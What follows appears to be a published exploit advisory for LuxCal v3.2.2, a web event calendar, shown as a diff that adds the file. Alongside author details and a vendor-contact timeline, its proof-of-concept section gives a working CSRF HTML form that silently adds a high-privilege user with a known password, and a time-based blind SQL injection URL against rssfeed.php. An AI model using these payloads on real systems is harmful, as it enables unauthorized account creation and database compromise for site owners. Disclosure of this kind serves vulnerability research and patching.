@@ -1,0 +1,58 @@
+[+] Author: TUNISIAN CYBER
+[+] Exploit Title: LuxCal v3.2.2 CSRF/Blind SQL Injection Vulnerabilities
+[+] Date: 09-03-2014
+[+] Category: WebApp
+[+] Tested on: KaliLinux/Windows 7 Pro
+[+] CWE: CWE-352/CWE-89
+[+] Vendor: http://www.luxsoft.eu/
+[+] Friendly Sites: na3il.com,th3-creative.com
+[+] Twitter: @TCYB3R
+
+1.OVERVIEW:
+LuxCal v3.2.2 suffers from a CSRF and Blind SQL Injection Vulnerabilities.
+
+2.Version:
+3.2.2
+
+3.Background:
+LuxCal is an innovative web based event calendar for home use and small businesses. 
+It is easy to setup and allows easy and fast management of your calendar events at home, 
+in the office, on business trips or when on holiday. LuxCal is feature rich, has been 
+designed for user-friendliness and will help you to make error-free data inputs. 
+The user interface colors are easy to customize. LuxCal is free "open source" software 
+released under the GNU General Public License
+http://www.luxsoft.eu/index.php?pge=dtail
+
+4.Proof Of Concept:
+CSRF:
+<html>
+<form method="POST" name="form0" action="http://127.0.0.1/lux/index.php?lc&editUser=y&uid=add">
+<input type="hidden" name="uname" value="tcyber"/>
+<input type="hidden" name="email" value="g4k@hot.mail"/>
+<input type="hidden" name="new_pw" value="123456"/>
+<input type="hidden" name="userRights" value="9"/>
+<input type='submit' name='addExe' value="Add Profile">
+</form>
+</html>
+
+Blind SQL Ijnection:
+http://127.0.0.1/lux/rssfeed.php?cal=(select(0)from(select(sleep(0)))v)/*%27%2b(select(0)from(select(sleep(0)))v)%2b%27%22%2b(select(0)from(select(sleep(0)))v)%2b%22*/
+"SQL error. See 'logs/mysql.log'"
+
+5.Solution(s):
+no contact from vendor
+
+6.TIME-LINE:
+2014-07-03: Vulnerability was discovered.
+2014-07-03: Contact with vendor.
+2014-08-03: No reply.
+2014-09-03: No reply.
+2014-09-03: Vulnerability Published
+
+
+
+7.Greetings:
+Xmax-tn
+Xtech-set
+N43il
+Sec4ver,E4A Members
